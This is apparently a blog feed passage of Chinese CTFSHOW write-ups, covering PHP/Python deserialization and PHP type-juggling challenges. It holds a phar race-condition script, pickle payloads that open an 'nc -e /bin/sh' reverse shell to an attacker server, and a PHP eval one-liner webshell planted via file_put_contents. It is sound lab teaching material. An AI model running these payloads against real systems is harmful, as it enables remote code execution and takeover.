写入phar包内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writePhar</span>(<span class="params">url,data</span>):</span><br><span class="line">    requests.post(url,data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发unlink的phar反序列化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlinkPhar</span>(<span class="params">url,data</span>):</span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    res = requests.post(url,data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    url = <span class="string">&#x27;http://92d61ef2-9ec6-44ba-90c9-59fc50181112.challenge.ctf.show/&#x27;</span></span><br><span class="line">    phar = getPhar(<span class="string">&#x27;phar.phar&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        w = threading.Thread(target=writePhar,args=(url+<span class="string">&#x27;?fn=p.phar&#x27;</span>,phar))</span><br><span class="line">        u = threading.Thread(target=unlinkPhar,args=(url+<span class="string">&#x27;?fn=phar://p.phar/test&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        w.start()</span><br><span class="line">        u.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="web277-python反序列化"><a href="#web277-python反序列化" class="headerlink" title="web277(python反序列化)"></a>web277(python反序列化)</h1><p>打开查看源代码，发现提示：</p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/277.png" alt=""></p><p>可以看出这是关于python的反序列化</p><p>尝试了一下，发现无回显，且<code>os.system</code>用不了，可以试试反弹shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.popen,(<span class="string">&#x27;nc 服务器ip 端口 -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">url=<span class="string">&quot;http://0efe0f23-3af2-400b-8010-019483f7aced.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>:base64.b64encode(s)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="web278-过滤os-system"><a href="#web278-过滤os-system" class="headerlink" title="web278(过滤os.system)"></a>web278(过滤os.system)</h1><p>过滤了<code>os.system</code>，可以直接用上题的payload利用反弹shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.popen,(<span class="string">&#x27;nc 服务器ip 端口 -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">url=<span class="string">&quot;http://0efe0f23-3af2-400b-8010-019483f7aced.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>:base64.b64encode(s)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-PHP特性</title>
      <link href="/2023/07/26/CTFSHOW-PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2023/07/26/CTFSHOW-PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web89-intval"><a href="#web89-intval" class="headerlink" title="web89(intval)"></a>web89(intval)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num[]=1</code></p><ul><li>preg_match()：只能处理字符串，当传入的是数组时会返回false</li><li>intval()：变量不能是array和object格式  成功时返回var的integer值，失败时返回0，空的array返回0，非空的array返回1</li></ul><h1 id="web90-强比较"><a href="#web90-强比较" class="headerlink" title="web90(强比较)"></a>web90(强比较)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=4476[a-z or .!@$%^\()等]</code></p><ul><li>intval()：如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是 - ，则从第二个开始算起</li><li>===：在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</li></ul><h1 id="web91-正则-m"><a href="#web91-正则-m" class="headerlink" title="web91(正则-m)"></a>web91(正则-m)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no no no no no&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?cmd=%0aphp</code></p><ul><li>/^php$/：正则表达式，匹配开始和结束位置，简单来说就是参数值为php</li><li>i：不区分大小写</li><li>m：多行匹配</li></ul><h1 id="web92-弱比较"><a href="#web92-弱比较" class="headerlink" title="web92(弱比较)"></a>web92(弱比较)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">4476</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>, <span class="number">0</span>) == <span class="number">4476</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=010574 or 4476e1</code></p><ul><li>==：在进行比较的时候，会先将字符串类型转化成相同类型，再比较</li></ul><h1 id="web93-进制转换"><a href="#web93-进制转换" class="headerlink" title="web93(进制转换)"></a>web93(进制转换)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=010574</code></p><ul><li>intval():  第二个参数为0时，通过对变量检测来判断<ul><li>0b??：二进制</li><li>0???：八进制</li><li>0x??：十六进制</li></ul></li></ul><h1 id="web94-strpos"><a href="#web94-strpos" class="headerlink" title="web94(strpos)"></a>web94(strpos)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num= 010574</code></p><ul><li>strpos()：返回在字符串首次出现的位置，如果没找到返回false</li></ul><h1 id="web95-strpos，intval，-，"><a href="#web95-strpos，intval，-，" class="headerlink" title="web95(strpos，intval，\=\=，===)"></a>web95(strpos，intval，\=\=，===)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num= 010574</code></p><h1 id="web96-php-filter"><a href="#web96-php-filter" class="headerlink" title="web96(php://filter/)"></a>web96(php://filter/)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?u=php://filter/resource=flag.php</code></p><ul><li>highlight_file()：打印输出或者返回文件中语法高亮版本的代码</li><li>利用伪协议读取文件内容</li></ul><h1 id="web97-md5"><a href="#web97-md5" class="headerlink" title="web97(md5)"></a>web97(md5)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: a[]=1&amp;b[]=1</code></p><ul><li>md5强比较，数组绕过</li><li>原理：md5()参数为数组时，不会报错，返回值为null</li></ul><h1 id="web98-amp"><a href="#web98-amp" class="headerlink" title="web98(=&amp;)"></a>web98(=&amp;)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag is here&quot;</span>;</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><code>payload: HTTP_FLAG=flag</code></p><ul><li>=&amp;：值或对象都将指向相同的数据    引用</li><li>get和post都指向相同的数据，而get又与cookie和server指向相同的数据，但题要求用get传参，所以使用post传参来替代get传参</li></ul><h1 id="web99-file-put-contents"><a href="#web99-file-put-contents" class="headerlink" title="web99(file_put_contents)"></a>web99(file_put_contents)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?n=1.php    content=&lt;?php eval($_POST[&#39;x&#39;]);?&gt;    蚁剑连接</code></p><ul><li>array_push()：将一个或者多个数据存入数组中</li><li>in_array()：检查数组中是否存在某个值 </li><li>file_put_contents()：将数据写入文件中</li></ul><blockquote><p>当in_array()检查的数据为数字加字符串时，会截取第一个非数字字符前的所有数字作为检查的对象，所以可以传1.php，在该函数中表现的是检测1是否存在，这样就绕过了该函数</p><p>写入文件的内容是什么呢？<br>目的是为了获得路径，读取目录，进而得到flag<br>所以可以写入一句话木马，用蚁剑连接，获得flag</p></blockquote><h1 id="web100-ReflectionClass"><a href="#web100-ReflectionClass" class="headerlink" title="web100(ReflectionClass)"></a>web100(ReflectionClass)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><ul><li>根据提示，得出flag在ctfshow()类中</li><li>在外层if判断只需让v0为真即可，v0为真，只需让<code>is_numeric($v1)</code>为真即可</li><li>第二层if判断中，不能有<code>;</code>，第三层if中必须有<code>;</code></li><li>根据php特性中的反射类相关知识，构造一个反射类，将ctfshow()相关信息，用echo打印出来即可</li></ul><h1 id="web101-ReflectionClass"><a href="#web101-ReflectionClass" class="headerlink" title="web101(ReflectionClass)"></a>web101(ReflectionClass)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><ul><li>正则过滤了一大堆东西，实际上payload跟上个题一样</li></ul><h1 id="web102-call-user-func"><a href="#web102-call-user-func" class="headerlink" title="web102(call_user_func)"></a>web102(call_user_func)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span 